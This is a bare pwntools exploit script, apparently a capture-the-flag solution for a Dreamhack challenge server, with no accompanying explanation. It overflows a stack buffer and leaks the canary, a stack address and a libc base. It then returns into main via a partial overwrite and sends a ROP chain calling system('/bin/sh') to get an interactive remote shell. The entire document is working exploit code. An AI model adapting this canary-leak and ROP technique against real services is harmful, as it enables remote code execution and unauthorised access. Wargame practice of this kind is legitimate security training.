from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 22641

while 1:
    try:
        r = remote(HOST, PORT)

        r.send(b'A'*0xa9)
        r.recvuntil(b'A'*0xa9)
        canary = u64(r.recv(7).ljust(8,b'\x00')) << 8
        stack = u64(r.recv(6).ljust(8,b'\x00'))

        buf = stack - 0x150
        main_rbp = stack + 0x38

        r.send(b'A'*0xa8 + p64(canary) + p64(main_rbp) + b'\xd2\x99')
        r.send(b'B'*0xb8)
        r.recvuntil(b'B'*0xb8)

        libc = u64(r.recv(6).ljust(8,b'\x00')) - 0x2a1ca
        binsh = libc + 0x1cc42f
        system = libc + 0x58750
        pop_rdi_rbp = libc + 0x2a873
        buf = stack - 0x180

        payload = flat([
            0,
            pop_rdi_rbp, binsh-0x1000,0,
            system
        ]).ljust(0xa8, b'\x00')

        payload += p64(canary) + p64(buf) + b'\xd2\x99'

        r.send(payload)

        r.interactive()
        break
    
    except (EOFError, TimeoutError, ValueError, RuntimeError):
        r.close()